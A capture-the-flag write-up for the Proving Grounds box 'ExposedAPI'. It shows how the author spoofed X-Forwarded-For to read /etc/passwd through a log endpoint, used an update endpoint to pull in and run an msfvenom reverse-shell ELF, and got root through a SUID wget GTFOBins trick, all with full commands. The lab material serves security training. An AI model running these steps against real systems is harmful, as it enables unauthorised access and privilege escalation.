---
title: Proving Grounds - ExposedAPI
date: 2023-03-20
author: Marius
tags: [ctf, 'proving grounds', 'pg']
---

Intermediate rated OSCP like box found in Proving Grounds Practice.

### Enumeration

Rustscan revealed open SSH port and API Software running on port 13337.

```
└─$ rustscan -a 192.168.168.134 -- -sC -sV | tee rust_nmap
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
13337/tcp open  http    syn-ack Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Interface of this API.

![API UI](/assets/img/exposedapi/1.png)

Looks like this box made it easy and provided me with instructions on how to use this API.

### Exploitation

I have launched a http listener and interacted with API to see If I will get a call back from **/update** endpoint.

```
└─$ python -m updog -p 80                                 
[+] Serving /home/kali/ctf/pg/exposedapi...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.2.147:80
Press CTRL+C to quit
```

```
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user": "root", "url": " <a href="http://192.168.45.5%22%7d'">http://192.168.45.5"}'</a> 192.168.168.134:13337/update
Invalid username.
```

Looks like I need to get a valid username first. Instead I've attempted to get something out of **/logs** endpoint.

```
└─$ curl -X GET 192.168.168.134:13337/logs 
WAF: Access Denied for this Host. 
```

I now need to bypass IP restriction, which can be easily be done with cURL by providing X-Forwarded-for header.

```
└─$ curl -X GET 192.168.168.134:13337/logs -H "X-Forwarded-for: localhost"
Error! No file specified. Use file=/path/to/log/file to access log files. 
```

I have provided **/etc/shadow** file as an input and received file content with valid usernames.

```
└─$ curl -X GET 192.168.168.134:13337/logs?file=/etc/passwd -H "X-Forwarded-for: localhost"
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        <br>
        <br>
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        <br>
        <br>
        <div class="divmain">
            <h3>Log:</h3>
            <div class="divmin">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

            </div>
        </div>
    </body>
</html>                                   
```

I have generated elf reverse shell and attempted to upload it via **/update** endpoint.

```
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=13337 -f elf > shell.elf 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

```
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user": "clumsyadmin", "url": " <a href="http://192.168.45.5/shell.elf%22%7d">http://192.168.45.5/shell.elf"}'</a> 192.168.168.134:13337/update
Update requested by clumsyadmin. Restart the software for changes to take effect. 
```

I have visited **/restart** endpoint via Firefox to restart this application and as expected I have received a reverse shell.

```
└─$ nc -nvlp 13337                                                       
listening on [any] 13337 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.168.134] 45590
whoami
clumsyadmin
```

### Privilege Escalation

Once I've collected user flag, I checked for SUID binaries.

```
clumsyadmin@xposedapi:/tmp$ find / -type f -perm -04000 -ls 2>/dev/null 
find / -type f -perm -04000 -ls 2>/dev/null 


   273373     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   276719    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   398815     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   266035     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
   262183     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
   265710     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
   276984    456 -rwsr-xr-x   1 root     root         466496 Apr  5  2019 /usr/bin/wget
   282583     36 -rwsr-xr-x   1 root     root          34896 Apr 22  2020 /usr/bin/fusermount
   266037     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
   262179     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
   262180     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
   265563     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
   272436    156 -rwsr-xr-x   1 root     root         157192 Jan 20  2021 /usr/bin/sudo
   262182     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
```

**Wget** is definitely an odd one out, you don't see it with SUID bit set that often. Naturally, I checked GTFOBins if this can be abused.


![GTFO Bins](/assets/img/exposedapi/2.png)


```
clumsyadmin@xposedapi:/tmp$ TF=$(mktemp)
TF=$(mktemp)

clumsyadmin@xposedapi:/tmp$ 
clumsyadmin@xposedapi:/tmp$ chmod +x $TF
chmod +x $TF

clumsyadmin@xposedapi:/tmp$ 
clumsyadmin@xposedapi:/tmp$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
clumsyadmin@xposedapi:/tmp$ 
clumsyadmin@xposedapi:/tmp$ wget --use-askpass=$TF 0
wget --use-askpass=$TF 0
# whoami
whoami
root
```

Worked like a charm, I am now root!



